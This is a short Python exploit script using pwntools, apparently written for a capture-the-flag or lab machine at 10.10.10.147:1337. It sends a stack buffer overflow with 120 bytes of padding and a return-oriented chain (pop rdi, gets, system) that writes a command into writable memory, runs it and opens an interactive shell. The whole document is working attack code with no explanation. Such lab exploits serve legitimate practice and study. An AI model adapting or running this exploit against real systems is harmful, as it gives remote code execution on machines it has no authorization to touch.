
from pwn import *

p = remote("10.10.10.147", 1337)
context(os="linux", arch="amd64")
context.log_level = "DEBUG"

JUNK = "A"*120
writable = p64(0x404000)
pop_rdi = p64(0x40120b)
gets = p64(0x401060)
system = p64(0x401040)

payload = JUNK + pop_rdi + writable + gets + pop_rdi + writable + system

p.recvline()
p.send(payload)
p.send('\n')
p.interactive()
